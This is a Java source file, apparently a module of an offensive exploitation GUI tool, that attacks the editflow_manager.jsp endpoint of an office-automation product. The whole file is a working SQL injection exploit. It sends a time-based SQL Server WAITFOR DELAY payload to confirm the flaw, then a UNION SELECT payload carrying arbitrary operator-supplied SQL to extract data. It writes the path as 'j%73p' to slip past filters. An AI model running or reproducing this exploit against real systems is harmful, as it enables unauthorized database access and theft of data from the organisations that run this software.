package exp.oa.FE;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class FE_editflow_manager_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            head.put("Content-Type","application/x-www-form-urlencoded");
            String data = "option=2&GUID=-1%27;WAITFOR+DELAY+%270%3a0%3a3%27--+";
            long var = HttpTools_getTime.post(url + "/sysform/003/editflow_manager.j%73p" ,data, head, "utf-8");
            if (var>3000 && var<4000) {
                String target_req = url + "/sysform/003/editflow_manager.j%73p";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ FE_editflow_manager_sqli ]");
                    textArea.appendText("\n (1) 延时注入,sql: sqlserver");
                    textArea.appendText("\n (2) 联合查询注入, CMD输入sql语句, eg: user_name()");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +"\n"+data+
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            head.put("Content-Type","application/x-www-form-urlencoded");
            String data = "option=2&GUID=-1%27+union+select+"+sql+"--+";
            Response post = HttpTools.post(url + "/sysform/003/editflow_manager.j%73p" ,data, head, "utf-8");
            if (post.getText()!="" && post.getCode() == 200) {
                String var = post.getText();
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入成功");
                    textArea_cmd.appendText("\n" + var);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入失败");
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }
}
